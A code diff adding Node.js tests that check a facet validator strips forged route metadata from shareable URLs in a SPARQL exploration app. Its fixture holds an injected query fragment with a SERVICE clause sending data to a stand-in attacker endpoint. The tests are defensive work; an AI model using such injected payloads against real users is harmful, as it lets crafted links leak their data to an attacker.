@@ -19,6 +19,7 @@
 
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
+import { navigationPath } from '../src/js/utils/navigationPath.js';
 import {
   addUnique,
   createPublicationNumberFacet,
@@ -556,4 +557,86 @@ test('addUnique Symbol-fallback: two malformed facets are never equal', () => {
   const { facets: after1 } = addUnique([], broken1);
   const { facets } = addUnique(after1, broken2);
   assert.equal(facets.length, 2);
+});
+
+// ── session-only route metadata ─────────────────────────────────────
+//
+// Tree clicks record how a resource was reached (viaPath / viaRoot /
+// viaRootPattern) so the SPARQL reference card can rebuild the property path.
+// That describes a live exploration and is deliberately kept out of shareable
+// URLs — so anything arriving over one is forged, and validateFacet is the
+// boundary that has to drop it.
+//
+// viaRootPattern is the dangerous one: the card interpolates it verbatim into
+// the Path row and offers it for copying, so a crafted ?facet= could put a
+// SERVICE clause aimed at an attacker's endpoint in front of a recipient,
+// presented as the app's own suggested query.
+
+const CRAFTED_ROUTE = {
+  viaPath: ['http://data.europa.eu/a4g/ontology#announcesRole'],
+  viaRoot: 'http://data.europa.eu/a4g/resource/id_x_Notice',
+  viaRootPattern: '?evil a epo:Notice . SERVICE <http://attacker.example/collect> { ?s ?p ?o } #',
+};
+
+test('validateFacet strips forged route metadata from a named-node facet', () => {
+  const cleaned = validateFacet({
+    type: 'named-node',
+    term: { termType: 'NamedNode', value: 'http://data.europa.eu/a4g/resource/id_x_Reviewer' },
+    ...CRAFTED_ROUTE,
+  });
+
+  assert.ok(cleaned, 'the facet itself is still valid');
+  for (const field of ['viaPath', 'viaRoot', 'viaRootPattern']) {
+    assert.ok(!(field in cleaned), `${field} does not cross the boundary`);
+  }
+});
+
+test('validateFacet strips route metadata from every facet type', () => {
+  const notice = validateFacet({ type: 'notice-number', value: '00100333-2025', ...CRAFTED_ROUTE });
+  const query = validateFacet({ type: 'query', query: 'SELECT * WHERE { ?s ?p ?o }', ...CRAFTED_ROUTE });
+
+  for (const cleaned of [notice, query]) {
+    assert.ok(cleaned);
+    assert.ok(!('viaRootPattern' in cleaned));
+  }
+});
+
+test('validateFacet keeps the fields it does not know about', () => {
+  // The spread is deliberate — timestamps and future fields must survive.
+  // Only the session-only ones are removed.
+  const cleaned = validateFacet({
+    type: 'notice-number',
+    value: '00100333-2025',
+    timestamp: 12345,
+    somethingElse: 'kept',
+    ...CRAFTED_ROUTE,
+  });
+
+  assert.equal(cleaned.timestamp, 12345);
+  assert.equal(cleaned.somethingElse, 'kept');
+  assert.ok(!('viaPath' in cleaned));
+});
+
+test('validateFacet does not mutate the object it was handed', () => {
+  const input = {
+    type: 'named-node',
+    term: { termType: 'NamedNode', value: 'http://data.europa.eu/a4g/resource/id_x_Reviewer' },
+    ...CRAFTED_ROUTE,
+  };
+  const snapshot = JSON.stringify(input);
+  validateFacet(input);
+  assert.equal(JSON.stringify(input), snapshot);
+});
+
+test('a forged route cannot reach the reference card', () => {
+  // End to end across the boundary: what initFromUrlParams would build from a
+  // crafted ?facet= plus ?root=, handed to the function that rebuilds the path.
+  const validated = validateFacet({
+    type: 'named-node',
+    term: { termType: 'NamedNode', value: 'http://data.europa.eu/a4g/resource/id_x_Reviewer' },
+    ...CRAFTED_ROUTE,
+  });
+  const breadcrumb = [{ type: 'notice-number', value: '00100333-2025' }, validated];
+
+  assert.deepEqual(navigationPath(breadcrumb, 1), { chain: [], anchor: null });
 });
